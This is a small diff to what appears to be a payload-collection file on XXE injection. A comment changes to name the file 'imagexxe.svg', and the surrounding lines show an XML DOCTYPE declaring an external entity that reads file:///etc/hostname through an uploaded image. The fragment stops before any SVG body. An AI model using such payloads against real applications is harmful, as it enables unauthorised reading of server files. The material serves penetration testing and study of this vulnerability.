@@ -1,5 +1,5 @@
 # XXE injection
-# This is an example of an image to upload and access to the etc/hostname of an application
+# This is an example of an image to upload and access to the etc/hostname of an application. imagexxe.svg
 
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
